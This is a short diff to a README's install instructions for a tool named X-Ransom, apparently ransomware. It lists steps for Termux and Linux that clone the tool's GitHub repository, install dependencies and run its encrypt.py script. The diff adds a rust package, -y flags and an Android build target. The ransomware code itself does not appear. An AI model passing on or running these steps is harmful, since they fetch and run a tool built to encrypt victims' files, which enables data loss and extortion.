@@ -12,9 +12,10 @@
 
 ```bash
 - apt update && apt upgrade -y
-- pkg install python3 git python3-pip
+- pkg install python3 git python3-pip rust -y
 - git clone https://github.com/MrG3P5/X-Ransom
 - cd X-Ransom
+- export CARGO_BUILD_TARGET=aarch64-linux-android
 - pip3 install -r require.txt
 - python3 encrypt.py
 ```
@@ -23,7 +24,7 @@
 
 ```bash
 - sudo apt update && apt upgrade -y
-- sudo apt-get install python3 git python3-pip
+- sudo apt-get install python3 git python3-pip -y
 - git clone https://github.com/MrG3P5/X-Ransom
 - cd X-Ransom
 - pip3 install -r require.txt
